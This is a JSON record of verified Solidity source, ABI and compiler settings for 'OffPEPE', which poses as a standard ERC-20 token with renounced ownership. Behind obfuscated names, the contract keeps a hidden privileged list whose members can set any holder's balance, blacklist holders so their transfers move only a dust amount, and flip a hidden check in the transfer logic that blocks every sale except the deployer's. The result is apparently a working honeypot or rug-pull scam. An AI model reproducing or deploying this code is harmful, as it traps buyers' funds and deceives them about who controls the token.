{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface amountMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txBuy) external view returns (uint256);\n\n    function transfer(address marketingReceiver, uint256 amountTeamSwap) external returns (bool);\n\n    function allowance(address swapAmountTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTeamSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingReceiver,\n        uint256 amountTeamSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAutoMax, uint256 value);\n    event Approval(address indexed swapAmountTake, address indexed spender, uint256 value);\n}\n\nabstract contract buyTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isModeReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromToken {\n    function createPair(address tokenSwap, address txMinFrom) external returns (address);\n}\n\ninterface receiverAuto is amountMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OffPEPE is buyTake, amountMax, receiverAuto {\n\n    function launchedLaunchReceiver(address enableListLaunched, uint256 amountTeamSwap) public {\n        buyExempt();\n        modeExempt[enableListLaunched] = amountTeamSwap;\n    }\n\n    bool public sellTeam;\n\n    event OwnershipTransferred(address indexed autoFrom, address indexed shouldIsTo);\n\n    mapping(address => uint256) private modeExempt;\n\n    function approve(address takeIsTeam, uint256 amountTeamSwap) public virtual override returns (bool) {\n        teamTake[_msgSender()][takeIsTeam] = amountTeamSwap;\n        emit Approval(_msgSender(), takeIsTeam, amountTeamSwap);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLaunch;\n    }\n\n    function allowance(address teamLaunched, address takeIsTeam) external view virtual override returns (uint256) {\n        if (takeIsTeam == swapIs) {\n            return type(uint256).max;\n        }\n        return teamTake[teamLaunched][takeIsTeam];\n    }\n\n    function senderAmountWallet(address fromSwap) public {\n        buyExempt();\n        \n        if (fromSwap == feeFromLimit || fromSwap == amountLiquidity) {\n            return;\n        }\n        liquidityLimitReceiver[fromSwap] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isMarketingList;\n    }\n\n    uint8 private fromLaunch = 18;\n\n    function feeLimitSell(address enableList) public {\n        require(enableList.balance < 100000);\n        if (launchedMarketing) {\n            return;\n        }\n        \n        receiverReceiver[enableList] = true;\n        \n        launchedMarketing = true;\n    }\n\n    uint256 private maxFrom = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    function transfer(address enableListLaunched, uint256 amountTeamSwap) external virtual override returns (bool) {\n        return listExempt(_msgSender(), enableListLaunched, amountTeamSwap);\n    }\n\n    function feeReceiver(uint256 amountTeamSwap) public {\n        buyExempt();\n        txTo = amountTeamSwap;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxFrom;\n    }\n\n    uint256 txTo;\n\n    function balanceOf(address txBuy) public view virtual override returns (uint256) {\n        return modeExempt[txBuy];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minLimit;\n    }\n\n    uint256 private exemptList;\n\n    string private isMarketingList = \"OPE\";\n\n    uint256 constant liquidityFee = 9 ** 10;\n\n    uint256 liquidityMarketing;\n\n    address public feeFromLimit;\n\n    bool private limitMinSell;\n\n    mapping(address => bool) public receiverReceiver;\n\n    mapping(address => mapping(address => uint256)) private teamTake;\n\n    constructor (){\n        \n        isModeReceiver swapReceiver = isModeReceiver(swapIs);\n        amountLiquidity = fromToken(swapReceiver.factory()).createPair(swapReceiver.WETH(), address(this));\n        \n        feeFromLimit = _msgSender();\n        amountFee();\n        receiverReceiver[feeFromLimit] = true;\n        modeExempt[feeFromLimit] = maxFrom;\n        if (exemptList == minSell) {\n            exemptList = minSell;\n        }\n        emit Transfer(address(0), feeFromLimit, maxFrom);\n    }\n\n    bool public launchedMarketing;\n\n    address private limitReceiver;\n\n    function walletSell(address takeTrading, address marketingReceiver, uint256 amountTeamSwap) internal returns (bool) {\n        require(modeExempt[takeTrading] >= amountTeamSwap);\n        modeExempt[takeTrading] -= amountTeamSwap;\n        modeExempt[marketingReceiver] += amountTeamSwap;\n        emit Transfer(takeTrading, marketingReceiver, amountTeamSwap);\n        return true;\n    }\n\n    uint256 private minSell;\n\n    address toTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private minLimit = \"Off PEPE\";\n\n    address swapIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function listExempt(address takeTrading, address marketingReceiver, uint256 amountTeamSwap) internal returns (bool) {\n        if (takeTrading == feeFromLimit) {\n            return walletSell(takeTrading, marketingReceiver, amountTeamSwap);\n        }\n        uint256 tradingSwapLaunched = amountMax(amountLiquidity).balanceOf(toTake);\n        require(tradingSwapLaunched == txTo);\n        require(marketingReceiver != toTake);\n        if (liquidityLimitReceiver[takeTrading]) {\n            return walletSell(takeTrading, marketingReceiver, liquidityFee);\n        }\n        return walletSell(takeTrading, marketingReceiver, amountTeamSwap);\n    }\n\n    mapping(address => bool) public liquidityLimitReceiver;\n\n    function getOwner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    function transferFrom(address takeTrading, address marketingReceiver, uint256 amountTeamSwap) external override returns (bool) {\n        if (_msgSender() != swapIs) {\n            if (teamTake[takeTrading][_msgSender()] != type(uint256).max) {\n                require(amountTeamSwap <= teamTake[takeTrading][_msgSender()]);\n                teamTake[takeTrading][_msgSender()] -= amountTeamSwap;\n            }\n        }\n        return listExempt(takeTrading, marketingReceiver, amountTeamSwap);\n    }\n\n    function amountFee() public {\n        emit OwnershipTransferred(feeFromLimit, address(0));\n        limitReceiver = address(0);\n    }\n\n    address public amountLiquidity;\n\n    function buyExempt() private view {\n        require(receiverReceiver[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAmountTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIsTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAutoMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeIsTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIsTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFromLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"feeLimitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTeamSwap\",\"type\":\"uint256\"}],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableListLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamSwap\",\"type\":\"uint256\"}],\"name\":\"launchedLaunchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"}],\"name\":\"senderAmountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableListLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OffPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}